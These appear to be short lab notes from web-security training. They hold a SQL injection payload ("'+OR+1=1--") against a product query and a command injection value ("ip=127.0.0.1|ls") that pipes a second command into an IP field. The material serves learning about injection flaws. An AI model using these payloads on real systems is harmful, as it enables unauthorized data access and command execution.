
### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

``` SELECT * FROM products WHERE category = 'Gifts' AND released = 1 ```

``` '+OR+1=1-- ```

## Other Injection Operators

>**Q. Try using the remaining three injection operators (new-line, &, |), and see how each works and how the output differs. Which of them only shows the output of the injected command?**

```sh
ip=127.0.0.1|ls
```
